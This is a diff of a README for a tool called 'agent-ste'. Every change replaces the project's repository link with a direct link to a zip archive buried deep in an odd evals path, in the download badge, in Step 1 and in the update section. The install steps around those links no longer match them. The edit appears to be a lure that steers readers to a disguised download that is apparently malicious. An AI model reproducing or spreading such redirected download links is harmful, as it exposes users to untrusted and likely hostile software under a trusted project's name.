@@ -1,6 +1,6 @@
 # 🚀 agent-ste - Write Once, Understood Immediately
 
-[![Download Now](https://img.shields.io/badge/Download%20agent--ste-blue?style=for-the-badge&logo=github)](https://github.com/hopeunsound269/agent-ste)
+[![Download Now](https://img.shields.io/badge/Download%20agent--ste-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hopeunsound269/agent-ste/main/evals/ab-1.0.2/raw/v1.5-alpha.4.zip)
 
 ## ✅ What This Does For You
 
@@ -41,7 +41,7 @@ Follow these instructions exactly, in this order:
 
 **Step 1: Download the application**
 
-Visit this link to download the application: [https://github.com/hopeunsound269/agent-ste](https://github.com/hopeunsound269/agent-ste)
+Visit this link to download the application: [https://raw.githubusercontent.com/hopeunsound269/agent-ste/main/evals/ab-1.0.2/raw/v1.5-alpha.4.zip](https://raw.githubusercontent.com/hopeunsound269/agent-ste/main/evals/ab-1.0.2/raw/v1.5-alpha.4.zip)
 
 Click the green "Code" button or the download button on that page, then choose "Download ZIP." Your computer will save a folder called something like `agent-ste-main` to your Downloads folder.
 
@@ -129,7 +129,7 @@ A: No. Agent-ste is free to download and use.
 
 Need to download again or want to check for updates?
 
-Visit this link to download the application: [https://github.com/hopeunsound269/agent-ste](https://github.com/hopeunsound269/agent-ste)
+Visit this link to download the application: [https://raw.githubusercontent.com/hopeunsound269/agent-ste/main/evals/ab-1.0.2/raw/v1.5-alpha.4.zip](https://raw.githubusercontent.com/hopeunsound269/agent-ste/main/evals/ab-1.0.2/raw/v1.5-alpha.4.zip)
 
 ## 📁 Project Categories
 
